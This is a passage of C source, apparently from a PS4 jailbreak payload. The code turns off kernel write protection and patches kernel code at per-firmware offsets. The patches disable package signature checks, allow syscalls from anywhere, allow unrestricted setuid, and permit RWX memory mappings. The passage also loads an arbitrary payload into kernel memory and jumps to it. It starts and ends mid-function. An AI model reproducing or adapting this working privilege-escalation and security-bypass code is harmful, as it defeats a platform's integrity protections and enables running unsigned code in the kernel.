  uint8_t *copyinstr_patch_2;
  uint8_t *copyinstr_patch_3;
  uint8_t *setlogin_patch;
  uint8_t *pfs_signature_check_patch;
  uint8_t *debug_rif_patch_1;
  uint8_t *debug_rif_patch_2;
  uint8_t *debug_settings_error_patch_1;
  uint8_t *debug_settings_error_patch_2;
  // uint8_t *mount_patch;
  uint8_t *depth_limit_patch;

  uint16_t fw_version = args->kpayload_firmware_info->fw_version;

  // NOTE: This is a C preprocessor macro
  build_kpayload(fw_version, patch_macro);

  // Disable write protection
  uint64_t cr0 = readCr0();
  writeCr0(cr0 & ~X86_CR0_WP);

  // Enable UART
  kmem = (uint8_t *)uart_patch;
  kmem[0] = 0x00;

  // sceSblACMgrIsDiagProcess
  // kmem = (uint8_t *)is_diag_process_patch;
  // kmem[0] = 0xB8;
  // kmem[1] = 0x01;
  // kmem[2] = 0x00;
  // kmem[3] = 0x00;
  // kmem[4] = 0x00;
  // kmem[5] = 0xC3;

  // sceSblACMgrIsAllowedSystemLevelDebugging
  // kmem = (uint8_t *)allow_system_level_logging_patch;
  // kmem[0] = 0xB8;
  // kmem[1] = 0x01;
  // kmem[2] = 0x00;
  // kmem[3] = 0x00;
  // kmem[4] = 0x00;
  // kmem[5] = 0xC3;

  // sceSblACMgrIsAllowedCoredump
  // kmem = (uint8_t *)allow_coredump_patch;
  // kmem[0] = 0xB8;
  // kmem[1] = 0x01;
  // kmem[2] = 0x00;
  // kmem[3] = 0x00;
  // kmem[4] = 0x00;
  // kmem[5] = 0xC3;

  // Patch copyin/copyout/copyinstr to allow userland + kernel addresses in both params
  // copyin
  kmem = (uint8_t *)copyin_patch_1;
  kmem[0] = 0xEB;
  kmem[1] = 0x00;

  if (fw_version >= 550) {
    kmem = (uint8_t *)copyin_patch_2;
    kmem[0] = 0xEB;
    kmem[1] = 0x01;
  }

  kmem = (uint8_t *)copyout_patch_1;
  kmem[0] = 0xEB;
  kmem[1] = 0x00;

  if (fw_version >= 550) {
    kmem = (uint8_t *)copyout_patch_2;
    kmem[0] = 0xEB;
    kmem[1] = 0x01;
  }

  // copyinstr
  kmem = (uint8_t *)copyinstr_patch_1;
  kmem[0] = 0xEB;
  kmem[1] = 0x00;

  if (fw_version >= 550) {
    kmem = (uint8_t *)copyinstr_patch_2;
    kmem[0] = 0xEB;
    kmem[1] = 0x01;
  }

  kmem = (uint8_t *)copyinstr_patch_3;
  kmem[0] = 0xEB;
  kmem[1] = 0x00;

  // setlogin patch (for autolaunch check)
  kmem = (uint8_t *)setlogin_patch;
  kmem[0] = 0x48;
  kmem[1] = 0x31;
  kmem[2] = 0xC0;
  kmem[3] = 0xEB;
  kmem[4] = 0x00;

  // Disable PFS signature check
  kmem = (uint8_t *)pfs_signature_check_patch;
  kmem[0] = 0x31;
  kmem[1] = 0xC0;
  kmem[2] = 0xC3;

  // Enable debug RIFs
  kmem = (uint8_t *)debug_rif_patch_1;
  kmem[0] = 0xB0;
  kmem[1] = 0x01;
  kmem[2] = 0xC3;

  kmem = (uint8_t *)debug_rif_patch_2;
  kmem[0] = 0xB0;
  kmem[1] = 0x01;
  kmem[2] = 0xC3;

  // Patch debug setting errors
  kmem = (uint8_t *)debug_settings_error_patch_1;
  kmem[0] = 0x00;
  kmem[1] = 0x00;
  kmem[2] = 0x00;
  kmem[3] = 0x00;

  kmem = (uint8_t *)debug_settings_error_patch_2;
  kmem[0] = 0x00;
  kmem[1] = 0x00;
  kmem[2] = 0x00;
  kmem[3] = 0x00;

  // Enable mount for unprivileged user
  // kmem = (uint8_t *)mount_patch;
  // kmem[0] = 0xEB;
  // kmem[1] = 0x04;

  // Change directory depth limit from 9 to 64
  kmem = (uint8_t *)depth_limit_patch;
  kmem[0] = 0x40;

  // Restore write protection
  writeCr0(cr0);

  return 0;
}

static void get_memory_dump2(uintptr_t addr, void *out, uint64_t outsz) {
  uint8_t *pout = (uint8_t *)out;
  uint8_t *paddr = (uint8_t *)addr;
  for (uint64_t o = 0; o < outsz; o++) {
    pout[o] = paddr[o];
  }
}

static uint64_t get_kernel_size(uint64_t kernel_base) {
  uint16_t elf_header_size;       // ELF header size
  uint16_t elf_header_entry_size; // ELF header entry size
  uint16_t num_of_elf_entries;    // Number of entries in the ELF header

  get_memory_dump2(kernel_base + 0x34, &elf_header_size, sizeof(uint16_t));
  get_memory_dump2(kernel_base + 0x34 + sizeof(uint16_t), &elf_header_entry_size, sizeof(uint16_t));
  get_memory_dump2(kernel_base + 0x34 + (sizeof(uint16_t) * 2), &num_of_elf_entries, sizeof(uint16_t));

  // printf_debug("elf_header_size: %u bytes\n", elf_header_size);
  // printf_debug("elf_header_entry_size: %u bytes\n", elf_header_entry_size);
  // printf_debug("num_of_elf_entries: %u\n", num_of_elf_entries);

  uint64_t max = 0;
  for (int i = 0; i < num_of_elf_entries; i++) {
    uint64_t temp_memsz;
    uint64_t temp_vaddr;
    uint64_t temp_align;
    uint64_t temp_max;

    uint64_t memsz_offset = elf_header_size + (i * elf_header_entry_size) + 0x28;
    uint64_t vaddr_offset = elf_header_size + (i * elf_header_entry_size) + 0x10;
    uint64_t align_offset = elf_header_size + (i * elf_header_entry_size) + 0x30;
    get_memory_dump2(kernel_base + memsz_offset, &temp_memsz, sizeof(uint64_t));
    get_memory_dump2(kernel_base + vaddr_offset, &temp_vaddr, sizeof(uint64_t));
    get_memory_dump2(kernel_base + align_offset, &temp_align, sizeof(uint64_t));

    temp_vaddr -= kernel_base;
    temp_vaddr += KERNEL_BASE_FILE;

    temp_max = (temp_vaddr + temp_memsz + (temp_align - 1)) & ~(temp_align - 1);

    if (temp_max > max) {
      max = temp_max;
    }
  }

  return max - KERNEL_BASE_FILE;
}

static uint64_t *u64_Scan(const void *module, uint64_t size_of_image, uint64_t value) {
  uint8_t *scanBytes = (uint8_t *)module;
  for (size_t i = 0; i < size_of_image; ++i) {
    uint64_t currentValue = *(uint64_t *)&scanBytes[i];
    if (currentValue == value) {
      return (uint64_t *)&scanBytes[i];
    }
  }
  return 0;
}

// Return 0 on success
// Return -1 on memory allocation error or unsupported firmware error
// Can also just give a memory error in the browser or panic the console on failure
static int kpayload_install_payload(struct thread *td, struct kpayload_install_payload_args *args) {
  UNUSED(td);
  void *kernel_base;
  uint8_t *kernel_ptr;

  // Use "kmem" for all patches
  uint8_t *kmem;

  // Pointers to be assigned in build_kpayload macro
  void *kernel_pmap_store;
  uint8_t *pmap_protect_p_patch;
  uint8_t *payload_buffer;

  void (*pmap_protect)(void *pmap, uint64_t sva, uint64_t eva, uint8_t pr);

  uint16_t fw_version = args->kpayload_payload_info->fw_version;
  struct configuration config = args->kpayload_payload_info->config;

  // NOTE: This is a C preprocessor macro
  build_kpayload(fw_version, install_macro);

  const uint64_t kptr = (uint64_t)kernel_ptr;
  const uint64_t kernelsz = get_kernel_size(kptr);
  if (!kptr || !kernelsz) {
    return -1;
  }
  const uint64_t SCE_RELA_tag = 0x6100002F;
  const uintptr_t *sce_reloc = u64_Scan(kernel_base, kernelsz, SCE_RELA_tag);
  // discard old value
  payload_buffer = 0;
  if (sce_reloc) {
    payload_buffer = (uint8_t *)(kptr + (sce_reloc[1] - KERNEL_BASE_FILE));
  } else {
    return -1;
  }
  if (!payload_buffer) {
    return -1;
  }

  uint8_t *payload_data = args->kpayload_payload_info->buffer;
  size_t payload_size = args->kpayload_payload_info->size;

  struct kpayload_payload_header *payload_header = (struct kpayload_payload_header *)payload_data;

  if (!payload_data || payload_size < sizeof(payload_header) || payload_header->signature != 0x5041594C4F414458ull) { // `payloadx`
    return -1;
  }

  // Disable write protection
  uint64_t cr0 = readCr0();
  writeCr0(cr0 & ~X86_CR0_WP);

  memset(payload_buffer, '\0', PAGE_SIZE);
  memcpy(payload_buffer, payload_data, payload_size);

  uint64_t sss = ((uint64_t)payload_buffer) & ~(uint64_t)(PAGE_SIZE - 1);
  uint64_t eee = ((uint64_t)payload_buffer + payload_size + PAGE_SIZE - 1) & ~(uint64_t)(PAGE_SIZE - 1);

  kmem = (uint8_t *)pmap_protect_p_patch;
  kmem[0] = 0xEB;
  pmap_protect(kernel_pmap_store, sss, eee, 7);
  kmem[0] = 0x75;

  // Restore write protection
  writeCr0(cr0);

  int (*payload_entrypoint)(uint16_t, struct configuration);
  *((void **)&payload_entrypoint) = (void *)(&payload_buffer[payload_header->entrypoint_offset]);

  return payload_entrypoint(fw_version, config);
}

// HACK: Fix missing/bad/conflicting exploit patches for supported FWs
// Lua+Lapse and PSFree+Lapse have the correct patch from 7.00-12.02, every FW *should* match these
// Try to get these patches fixed/added upstream if possible
// It's hard to tell with some of them because so many people forked/tweaked it
// These fixes can be opinionated/pedantic, but the goal is to have every kernel looking the same post exploit
static int kpayload_exploit_fixes(struct thread *td, struct kpayload_firmware_args *args) {
  UNUSED(td);
  void *kernel_base;
  uint8_t *kernel_ptr;

  // Use "kmem" for all patches
  uint8_t *kmem;

  uint16_t fw_version = args->kpayload_firmware_info->fw_version;

  // NOTE: This is a C preprocessor macro
  build_kpayload(fw_version, kernel_ptr_macro);

  // Disable write protection
  uint64_t cr0 = readCr0();
  writeCr0(cr0 & ~X86_CR0_WP);

  // TODO:
  // 4.74                         // PS4-5.05-Kernel-Exploit
  // 5.00, 5.01, 5.03             // PS4-5.05-Kernel-Exploit, ps4-ipv6-uaf
  // 5.50, 5.53, 5.55, 5.56       // ps4-ipv6-uaf
  // 6.00, 6.02, 6.20, 6.50, 6.51 // ps4-ipv6-uaf
  // 6.70, 6.71                   // ps4-ipv6-uaf, ps4jb2
  if (fw_version >= 505 && fw_version <= 507) {
    // Fixes
    //   - [X] PS4-5.05-Kernel-Exploit
    //   - [X] ps4-ipv6-uaf

    // Remove extra patch from ps4-ipv-uaf that provides more crash info
    // TODO: We need to double check this and make sure we don't clobber a
    // patch we make in `install_patches()`
    kmem = (uint8_t *)&kernel_ptr[0x007673E0];
    kmem[0] = 0x55;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00000ABD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EA47D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EA4C1]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EA53D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EA581]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EA71D]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EAB4D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x001EAC0D]; // copystr
    kmem[0] = 0xEB;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000493];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C5];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004BC];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B1];
    kmem[0] = 0x48;
    kmem[1] = 0x3B;
    kmem[2] = 0x90;
    kmem[3] = 0xE0;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0xEB;
    kmem[8] = 0x00;

    // repair sys_setuid() from exploit
    kmem = (uint8_t *)&kernel_ptr[0x00054A72];
    kmem[0] = 0xE8;
    kmem[1] = 0x39;
    kmem[2] = 0xB1;
    kmem[3] = 0x2A;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00054A7D];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x001A3C06];
    kmem[0] = 0x38;
    kmem[1] = 0xFA;
    kmem[2] = 0x0F;
    kmem[3] = 0x85;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0x00;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00237F3A];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0xC0;
    kmem[3] = 0x01;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x48;
    kmem[7] = 0x8B;

    kmem = (uint8_t *)&kernel_ptr[0x02B2620];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;
    kmem[4] = 0x25;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0x00;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x013D620];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x013D623];
    kmem[0] = 0x37;
  } else if (fw_version == 672) {
    // Fixes
    //   - [X] ps4jb2
    //   - [X] ps4-ipv6-uaf

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x0063C8CE]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C14FD]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C1541]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C15BD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C1601]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C17AD]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C1C5D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003C1D2D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0063D1CF];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C6];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    kmem = (uint8_t *)&kernel_ptr[0x000004BD];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B2];
    kmem[0] = 0x48;
    kmem[1] = 0x3B;
    kmem[2] = 0x90;
    kmem[3] = 0xE8;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0xEB;
    kmem[8] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x010BED0];
    kmem[0] = 0xE8;
    kmem[1] = 0xBB;
    kmem[2] = 0x1B;
    kmem[3] = 0xFC;
    kmem[4] = 0xFF;
    kmem[5] = 0x85;
    kmem[6] = 0xC0;
    kmem[7] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00451DB8];
    kmem[0] = 0x0F;
    kmem[1] = 0x85;
    kmem[2] = 0x00;
    kmem[3] = 0x00;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x001D83CE];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x001D895A];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0xC6;
    kmem[3] = 0x01;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x041A2D0];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00AB57A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x00AB57D];
    kmem[0] = 0x37;
  } else if (fw_version >= 700 && fw_version <= 702) {
    // Fixes
    //   - [X] ps4jb2
    //   - [X] ps4-ipv6-uaf
    //   - [X] pppwn

    // Unpatch SysVeri
    kmem = (uint8_t *)&kernel_ptr[0x0063A160];
    kmem[0] = 0x55;

    kmem = (uint8_t *)&kernel_ptr[0x0063ACC0];
    kmem[0] = 0x8B;
    kmem[1] = 0x05;
    kmem[2] = 0x32;
    kmem[3] = 0x09;

    kmem = (uint8_t *)&kernel_ptr[0x00639F10];
    kmem[0] = 0x55;
    kmem[1] = 0x48;
    kmem[2] = 0x89;
    kmem[3] = 0xE5;

    kmem = (uint8_t *)&kernel_ptr[0x0063A6E0];
    kmem[0] = 0x55;
    kmem[1] = 0x48;
    kmem[2] = 0x89;
    kmem[3] = 0xE5;

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x0002F295];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x0002F1A0];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x0002F741];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x0063ACCE]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002EF8D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002EFD1]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002F04D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002F091]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002F23D]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002F6ED]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0002F7BD]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0063B5EF];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C6];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    kmem = (uint8_t *)&kernel_ptr[0x000004BD];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B2];
    kmem[0] = 0x48;
    kmem[1] = 0x3B;
    kmem[2] = 0x90;
    kmem[3] = 0xE8;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0xEB;
    kmem[8] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x00087B70];
    kmem[0] = 0xE8;
    kmem[1] = 0x7B;
    kmem[2] = 0x12;
    kmem[3] = 0x03;
    kmem[4] = 0x00;
    kmem[5] = 0x85;
    kmem[6] = 0xC0;
    kmem[7] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00264C08];
    kmem[0] = 0x0F;
    kmem[1] = 0x85;
    kmem[2] = 0x00;
    kmem[3] = 0x00;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x00094EC1];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0009547B];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0xBC;
    kmem[3] = 0x01;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x002F2C20];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x001D2336];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x001D2339];
    kmem[0] = 0x37;
  } else if (fw_version >= 750 && fw_version <= 755) {
    // Fixes
    //   - [X] ps4jb2
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x0028FA55];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x0028F960];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x0028FF01];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00637394]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ADD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028F74D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028F791]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028F80D]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028F851]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028F9FD]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028FEAD]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0028FF7D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x00637CCF];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C6];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    kmem = (uint8_t *)&kernel_ptr[0x000004BD];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B2];
    kmem[0] = 0x48;
    kmem[1] = 0x3B;
    kmem[2] = 0x90;
    kmem[3] = 0xE8;
    kmem[4] = 0x00;
    kmem[5] = 0x00;
    kmem[6] = 0x00;
    kmem[7] = 0xEB;
    kmem[8] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x0037A320];
    kmem[0] = 0xE8;
    kmem[1] = 0x8B;
    kmem[2] = 0x49;
    kmem[3] = 0x06;
    kmem[4] = 0x00;
    kmem[5] = 0x85;
    kmem[6] = 0xC0;
    kmem[7] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x003014C8];
    kmem[0] = 0x0F;
    kmem[1] = 0x85;
    kmem[2] = 0x00;
    kmem[3] = 0x00;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x00451E04];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x004523C4];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;
    kmem[2] = 0xC7;
    kmem[3] = 0x01;
    kmem[4] = 0x00;
    kmem[5] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00029A30];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x000DB17D];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x000DB180];
    kmem[0] = 0x37;
  } else if (fw_version >= 800 && fw_version <= 803) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x0025E415];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x0025E320];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x0025E8C1];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x0062D254]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E10D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E151]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E1CD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E211]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E3bD]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E86D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x0025E93D]; // copystr
    kmem[0] = 0xEB;

    // stop sysVeri from causing a delayed panic on suspend
    kmem = (uint8_t *)&kernel_ptr[0x0062DB3F];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch amd64_syscall() to allow calling syscalls everywhere
    kmem = (uint8_t *)&kernel_ptr[0x00000490];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004C2];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000004B9];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x000004B5];
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    // patch sys_setuid() to allow freely changing the effective user ID
    kmem = (uint8_t *)&kernel_ptr[0x0034D696];
    kmem[0] = 0xEB;

    // patch vm_map_protect() (called by sys_mprotect()) to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x003EC68D];
    kmem[0] = 0x00;
    kmem[1] = 0x00;
    kmem[2] = 0x00;
    kmem[3] = 0x00;

    // TODO: Description of this patch. patch sys_dynlib_load_prx()
    kmem = (uint8_t *)&kernel_ptr[0x00318D84];
    kmem[0] = 0x90;
    kmem[1] = 0xE9;

    // patch sys_dynlib_dlsym() to allow dynamic symbol resolution everywhere
    kmem = (uint8_t *)&kernel_ptr[0x0031953F];
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x000951C0];
    kmem[0] = 0x48;
    kmem[1] = 0x31;
    kmem[2] = 0xC0;
    kmem[3] = 0xC3;

    // patch sys_mmap() to allow rwx mappings
    kmem = (uint8_t *)&kernel_ptr[0x00FD03A];
    kmem[0] = 0x37;

    kmem = (uint8_t *)&kernel_ptr[0x00FD03D];
    kmem[0] = 0x37;
  } else if (fw_version >= 850 && fw_version <= 852) {
    // Fixes
    //   - [X] pppwn

    // Unpatch extra bytes from copyin, copyout, and copinstr (pppwn)
    kmem = (uint8_t *)&kernel_ptr[0x003A4345];
    kmem[0] = 0xC7;

    kmem = (uint8_t *)&kernel_ptr[0x003A4250];
    kmem[0] = 0xC6;

    kmem = (uint8_t *)&kernel_ptr[0x003A47F1];
    kmem[0] = 0xCE;

    // ChendoChap's patches from pOOBs4
    kmem = (uint8_t *)&kernel_ptr[0x00624674]; // veriPatch
    kmem[0] = 0xEB;
    kmem[1] = 0x00;

    kmem = (uint8_t *)&kernel_ptr[0x00000ACD]; // bcopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A403D]; // bzero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A4081]; // pagezero
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A40fD]; // memcpy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A4141]; // pagecopy
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A42ED]; // copyin
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A479D]; // copyinstr
    kmem[0] = 0xEB;

    kmem = (uint8_t *)&kernel_ptr[0x003A486D]; // copystr
    kmem[0] = 0xEB;

